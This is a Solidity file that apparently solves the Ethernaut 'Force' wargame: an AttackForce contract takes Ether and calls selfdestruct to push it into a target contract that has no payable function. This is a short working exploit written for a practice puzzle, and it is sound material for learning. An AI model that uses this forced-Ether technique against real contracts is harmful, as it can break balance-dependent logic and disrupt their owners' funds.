// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AttackForce {

//  function getBalance() public view returns (uint) {
//    return address(this).balance;
//  }
//
//  constructor() public {
//
//  }
//
//
//  function attack(address _address) payable public {
//    selfdestruct(_address);
//  }
  function destruct(address payable _to) external payable {
    selfdestruct(_to);
  }

  constructor() public payable{ //use the Value filed of RemixIDE to send Ether at creation of the contract
  }

  function giveMeMoney() public payable{ //use the Value field to send money (if you didn't send any at initiation)

  }

}